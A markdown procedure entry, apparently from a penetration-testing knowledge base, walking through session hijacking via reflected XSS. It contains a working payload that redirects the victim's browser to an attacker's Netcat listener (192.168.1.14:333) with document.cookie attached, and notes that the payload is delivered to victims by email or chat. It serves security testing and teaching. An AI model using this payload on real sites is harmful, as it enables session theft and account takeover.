---
id: 022eef4d-a6f3-4798-a58f-7106e4268374
name: Session Hijacking Through Reflected XSS
type: procedure
verified: true
submitted: true
created_at: '2020-07-23T14:34:05.969384+00:00'
updated_at: '2023-05-26T18:26:23.344129+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[Web Applications]]'
- '[[xss]]'
---

# Session Hijacking Through Reflected XSS

**Status**: ✓ Verified

## Summary

Description Session hijacking is possible through XSS vulnerabilities. An attacker will setup a listener and make the browser to initiate connection to the listener carrying session cookies along with the request. Instructions 1. Insert the javascript payload with document.cookie property through i

## Description

# Description 

Session hijacking is possible through XSS vulnerabilities. An attacker will setup a listener and make the browser to initiate connection to the listener carrying session cookies along with the request.

# 

# Instructions

# 

1. Insert the *javascript* payload with document.cookie property through input field



Payload: *<script>alert(document.cookie)</script>*



![30ff894c-1703-491c-919b-b5c72ec30bc4.jpg](_assets/images/Mash/30ff894c-1703-491c-919b-b5c72ec30bc4.jpg)





2. The inserted payload is executed popping up the SESSION_ID of the application.





![421153db-802d-44fa-a5b7-30eb3e34c097.jpg](_assets/images/Mash/421153db-802d-44fa-a5b7-30eb3e34c097.jpg)





3. A listener is setup in the attacker's machine (192.168.1.14) using Netcat on port 333 as shown below.





![7aea1d5a-fdaf-4a24-a64b-154cb20f4f6f.jpg](_assets/images/Mash/7aea1d5a-fdaf-4a24-a64b-154cb20f4f6f.jpg)







4. A payload that makes request to the attacker's listener is constructed and passed as input to the search field as shown below.



Payload: *<script type="text/javascript">document.location='http://192.168.1.14:333?cookie='+document.cookie;</script>*





![980475ac-5666-44b1-9eda-d486233875b0.jpg](_assets/images/Mash/980475ac-5666-44b1-9eda-d486233875b0.jpg)







5. The inserted script is executed by connecting to the attacker's listener, carrying SESSION ID as shown below.









![c7de8c14-ae42-46b5-bc08-a37f153dfc73.jpg](_assets/images/Mash/c7de8c14-ae42-46b5-bc08-a37f153dfc73.jpg)





Note: In real-time scenarios, the payload is sent to victim as URL through various techniques like Email, Instant Messaging etc.





## Platforms

- Web

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[Web Applications]]
- [[xss]]


